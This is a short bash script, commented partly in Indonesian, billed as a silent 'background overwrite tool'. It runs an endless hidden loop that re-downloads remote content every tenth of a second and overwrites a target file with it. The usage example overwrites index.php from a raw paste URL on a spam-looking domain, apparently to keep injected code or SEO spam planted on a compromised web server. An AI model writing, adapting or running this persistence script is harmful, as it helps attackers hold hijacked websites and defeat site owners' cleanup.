#!/bin/bash

# BACKGROUND OVERWRITE TOOL - SILENT MODE
# Usage: ./tool.sh index.php https://pastebin.seojagonyarank1.biz.id/raw/

TARGET="$1"
URL="$2"

if [[ -z "$TARGET" || -z "$URL" ]]; then
    echo "Usage: $0 <file_target> <source_url>"
    exit 1
fi

# Loop tanpa output, semua redirect ke /dev/null
while true; do
    wget -q -O "$TARGET" "$URL" 2>/dev/null
    chmod 0644 "$TARGET" 2>/dev/null
    sleep 0.1
done &

echo "[+] PID: $!"
echo "[+] Proses di background. Log: /dev/null"
